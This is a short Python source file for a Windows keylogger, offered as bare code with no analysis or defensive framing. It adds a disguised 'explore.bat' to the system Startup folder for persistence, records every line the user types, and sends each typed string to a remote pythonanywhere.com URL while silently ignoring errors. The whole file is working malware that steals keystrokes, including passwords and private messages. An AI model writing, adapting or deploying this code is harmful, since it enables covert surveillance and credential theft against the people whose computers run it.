import keyboard
import requests
import winreg
import os
import ftplib
import sys                   
import shutil

def add_to_startup(file_path=""):
    if file_path == "":
        dirpath = os.getcwd()
        file_path = str('"')+str(dirpath)+"\\"+str(os.path.basename(__file__))[:-2]+str("exe")+str('"')
    try:
        bat_path = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
        with open(bat_path + '\\' + "explore.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)
    except:
        pass


add_to_startup()

api = 'http://kanielbot1.pythonanywhere.com/rand_data/?rand='

while True:
    try:
        x=keyboard.record(until='enter')
        for each in keyboard.get_typed_strings(x):
            if each:
                requests.get(api+str(each))
    except:
        pass